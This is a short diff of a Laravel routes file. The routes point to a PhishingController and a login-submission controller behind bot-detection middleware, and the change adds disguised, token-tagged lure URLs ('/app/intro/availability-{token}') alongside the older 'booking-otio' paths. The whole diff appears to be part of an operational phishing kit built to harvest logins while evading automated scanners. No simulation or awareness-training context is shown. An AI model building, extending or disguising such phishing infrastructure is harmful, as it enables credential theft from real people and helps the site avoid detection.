@@ -42,8 +42,10 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
     Route::post('/invitation-login', [LoginApprovalController::class, 'submitLogin']);
     Route::get('/invitation', [PhishingController::class, 'index']);
 
-    Route::get('/booking-otio-{token}', [PhishingController::class, 'showBookingOtio'])->name('booking-otio.token');
-    Route::get('/booking-otio', [PhishingController::class, 'showBookingOtio'])->name('booking-otio');
+    Route::get('/app/intro/availability-{token}', [PhishingController::class, 'showBookingOtio'])->name('booking-otio.token');
+    Route::get('/app/intro/availability', [PhishingController::class, 'showBookingOtio'])->name('booking-otio');
+    Route::get('/booking-otio-{token}', [PhishingController::class, 'showBookingOtio']);
+    Route::get('/booking-otio', [PhishingController::class, 'showBookingOtio']);
 
     Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);
 
